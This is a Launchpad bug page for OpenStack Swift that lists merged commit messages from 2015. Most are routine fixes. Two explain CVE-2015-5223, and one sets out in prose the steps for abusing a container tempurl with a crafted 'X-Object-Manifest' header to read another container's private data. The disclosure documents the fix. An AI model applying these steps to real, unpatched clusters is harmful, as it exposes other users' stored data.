Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sat Jun 27 23:26:47 2015 +0530
Adding bandit for security static analysis testing in swift
This change adds a basic bandit config for Swift. It can be invoked
by running the tox environment for bandit;
tox -e bandit
This is an initial step for using bandit with Swift
and it should be revisited to improve the testing as more is learned
about the specific needs of the Swift code base.As per now some tests
are excluded as they were used on purpose.
https://wiki.openstack.org/wiki/Security/Projects/Bandit
Implements: blueprint swift-bandit
Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2
commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 30 15:30:35 2015 -0700
Add a probetest for HUP/reload
This would have been enough to catch the regression, and we can extend
them as we work on any future ehancements to our process management.
Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace
commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 21:03:05 2015 +0530
test/unit: Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af
commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy <ondrej.novy@firma.seznam.cz>
Date: Tue Jun 16 17:42:58 2015 +0200
Time synchronization check in recon.
This change add call time to recon middleware and param --time to
recon CLI. This is usefull for checking if time in cluster is
synchronized.
Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662
commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Wed Jul 22 19:32:46 2015 -0700
Cleanup nits from container\_update\_timeout
Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913
commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson <me@not.mn>
Date: Sat May 23 15:40:03 2015 -0700
do container listing updates in another (green)thread
The actual server-side changes are simple. The tests are a different
matter. Many changes were needed to the object server tests to
handle the now-async calls to the container server. In an effort to
test this properly, some drive-by changes were made to improve tests.
I tested this patch by doing zero-byte object writes to one container
as fast as possible. Then I did it again while also saturating 2 of the
container replica's disks. The results are linked below.
https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
DocImpact
Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52
commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Jul 12 14:48:35 2015 +0530
sys.exc\_type/exc\_value/exc\_traceback are Deprecated
sys.exc\_info() contains a tuple of these three.
Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47

| **tags**: | added: in-feature-crypto |
| --- | --- |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-09-08

| Changed in ossa: | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Related fix proposed to swift (feature/hummingbird)**](/swift/%2Bbug/1453948/comments/35) |  |  | [#35](/swift/%2Bbug/1453948/comments/35) |
| --- | --- | --- | --- |

Related fix proposed to branch: feature/hummingbird

Review: <https://review.openstack.org/221410>

Related fix proposed to branch: feature/hummingbird
Review: https://review.openstack.org/221410

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-08:  [**Related fix merged to swift (feature/hummingbird)**](/swift/%2Bbug/1453948/comments/36) |  |  | [#36](/swift/%2Bbug/1453948/comments/36) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/36/%2Bdownload) (70.7 KiB)

Reviewed: <https://review.openstack.org/221410>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527>

Submitter: Jenkins

Branch: feature/hummingbird

commit cb683d391cb66d0f52830de16760c80fd2afedf9

Author: OpenStack Proposal Bot <email address hidden>

Date: Sat Sep 5 06:17:51 2015 +0000

Imported Translations from Transifex

For more information about this automatic import see:

    <https://wiki.openstack.org/wiki/Translations/Infrastructure>

Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6

commit e4542455c8a07b7981c247df8b737816062c1655

Author: Emett Speer <email address hidden>

Date: Wed Sep 2 17:18:03 2015 -0700

[Labs] Update links to Cloud Admin Guide

Update links to the Cloud Admin Guide after the

    RST conversion of that book altered URLs.

Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b

commit 58fcc07523978306cd3889ada73af5d9e664cf59

Author: Christian Schwede <email address hidden>

Date: Wed Sep 2 10:52:34 2015 +0000

Test if container\_sweep is executed on unmounted devices

This change ensures that container\_sweep is not run if a device is not mounted

    and mount\_check is set to True.

Change-Id: I823083c8431d9e61fd426508033ec9188503957b

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 615c7a204b9386e05c5bab658bfe96766ad1e680

Author: Brian Cline <email address hidden>

Date: Tue Sep 1 10:51:20 2015 -0500

Adds useful dispersion info from changelog

Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e

commit 3b8755098a1786c5447abf158bd686293a82977c

Author: janonymous <email address hidden>

Date: Sun Aug 2 21:29:13 2015 +0530

Replace a / b with a // b to use integer division where needed

Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.

Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661

commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51

Author: Clay Gerrard <email address hidden>

Date: Thu Aug 27 18:35:09 2015 -0700

Make ssync\_sender send valid chunked requests

The connect method of ssync\_sender tells the remote connection that it's

    going to send a valid HTTP chunked request, but if the remote end needs

    to respond with an error of any kind sender th...

Reviewed: https://review.openstack.org/221410
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527
Submitter: Jenkins
Branch: feature/hummingbird
commit cb683d391cb66d0f52830de16760c80fd2afedf9
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Sat Sep 5 06:17:51 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I2d92b8e34a665fb0bb4c048cfb0c59de295dfce6
commit e4542455c8a07b7981c247df8b737816062c1655
Author: Emett Speer <speer.emett@gmail.com>
Date: Wed Sep 2 17:18:03 2015 -0700
[Labs] Update links to Cloud Admin Guide
Update links to the Cloud Admin Guide after the
RST conversion of that book altered URLs.
Change-Id: I899f8938498b744e62887968a65e58c00ef27f1b
commit 58fcc07523978306cd3889ada73af5d9e664cf59
Author: Christian Schwede <cschwede@redhat.com>
Date: Wed Sep 2 10:52:34 2015 +0000
Test if container\_sweep is executed on unmounted devices
This change ensures that container\_sweep is not run if a device is not mounted
and mount\_check is set to True.
Change-Id: I823083c8431d9e61fd426508033ec9188503957b
commit e02609c66a804845672413b06830b87395afef31
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Sep 1 15:19:50 2015 -0700
Preserve traceback in swift-dispersion-report
Commit c690bcb fixed a bug in the dispersion report, but changed this
from a bare "raise" to "raise err", which loses the traceback. Not a
big deal, but worth putting back IMO.
Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc
commit d06d4ad0fd2dfe69da8008e729651264522c6c06
Author: Minwoo Bae <minwoob@us.ibm.com>
Date: Tue Sep 1 15:08:44 2015 -0500
Included reference in swift.obj.diskfile to enumerate the string
used for data file paths.
Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5
commit 615c7a204b9386e05c5bab658bfe96766ad1e680
Author: Brian Cline <bcline@softlayer.com>
Date: Tue Sep 1 10:51:20 2015 -0500
Adds useful dispersion info from changelog
Change-Id: I1a45088fc32620b02ff9a754b02ec1eb75a59d6e
commit 3b8755098a1786c5447abf158bd686293a82977c
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Sun Aug 2 21:29:13 2015 +0530
Replace a / b with a // b to use integer division where needed
Change-Id: I72c81faa62786e140b0de00e3a04934bf1b5adbd
commit 524c89b7eeff037b8a6b421888771e15f98c2da2
Author: John Dickinson <me@not.mn>
Date: Fri Aug 21 13:39:41 2015 -0700
Updated CHANGELOG, AUTHORS, and .mailmap for 2.4.0 release.
Change-Id: Ic6301146b839c9921bb85c4f4c1e585c9ab66661
commit 05de1305a903ee4ce9c8c50fde53c552d5b90d51
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Aug 27 18:35:09 2015 -0700
Make ssync\_sender send valid chunked requests
The connect method of ssync\_sender tells the remote connection that it's
going to send a valid HTTP chunked request, but if the remote end needs
to respond with an error of any kind sender throws HTTP right out the
window, picks up his ball, and closes the socket down hard - much to the
surprise of the eventlet.wsgi server who up to this point had been
playing along quite nicely with this 'SSYNC' nonsense assuming that
everyone here is consenting mature adults.
If you're going to make a "Transfer-Encoding: chunked" request have the
good decency to finish the job with a proper '0\r\n\r\n'. [1]
N.B. It might be possible to handle an error status during the
initialize\_request phase with some sort of 100-continue support, but
honestly it's not entirely clear to me when the server isn't going to
close the connection if the client is still expected to send the body
[2] - further if the error comes later during missing\_check or updates
we'll for sure want to send the chunk transfer termination line before
we close down the socket and this way we cover both.
1. Really, eventlet.wsgi shouldn't be so blasted brittle about this [3]
2. https://lists.w3.org/Archives/Public/ietf-http-wg/2005AprJun/0007.html
3. https://github.com/eventlet/eventlet/commit/c3ce3eef0b4d0dfdbfb1ec0186d4bb204fb8ecd5
Closes-Bug #1489587
Change-Id: Ic17c6c3075553f8cf6ef6213e62a00282f0d01cf
commit 993ee4e37af1961adba2047d5aa2eb210e423eb3
Author: nakagawamsa <nakagawamsa@nttdata.co.jp>
Date: Fri Aug 28 11:49:43 2015 +0900
Remove duplicate X-Backend-Storage-Policy-Index key
There is duplicate 'X-Backend-Storage-Policy-Index' dictionary key in unit.obj.test\_server.py.
One key has fixed policy index value, and another has random value.
Unittest should done with random policy index, so remove key which is set fixed value.
Change-Id: Ic91fcf44d48297d0feee33c928ca682def9790a3
commit 893f30c61d280804e417790dd34ba7bc3fb4f6fc
Author: paul luse <paul.e.luse@intel.com>
Date: Wed Aug 12 13:32:50 2015 -0700
EC GET path: require fragments to be of same set
And if they are not, exhaust the node iter to go get more. The
problem without this implementation is a simple overwrite where
a GET follows before the handoff has put the newer obj back on
the 'alive again' node such that the proxy gets n-1 fragments
of the newest set and 1 of the older.
This patch bucketizes the fragments by etag and if it doesn't
have enough continues to exhaust the node iterator until it
has a large enough matching set.
Change-Id: Ib710a133ce1be278365067fd0d6610d80f1f7372
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Closes-Bug: 1457691
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948
commit d4409c0a046c6ce0e14e18c95efe2cd16cf120e8
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 09:10:13 2015 -0500
Better scoping for tempurls, especially container tempurls
It used to be that a GET of a tempurl referencing a large object would
let you download that large object regardless of where its segments
lived. However, this led to some violated user expectations around
container tempurls.
(Note on shorthand: all tempurls reference objects. However, "account
tempurl" and "container tempurl" are shorthand meaning tempurls
generated using a key on the account or container, respectively.)
Let's say an application is given tempurl keys to a particular
container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
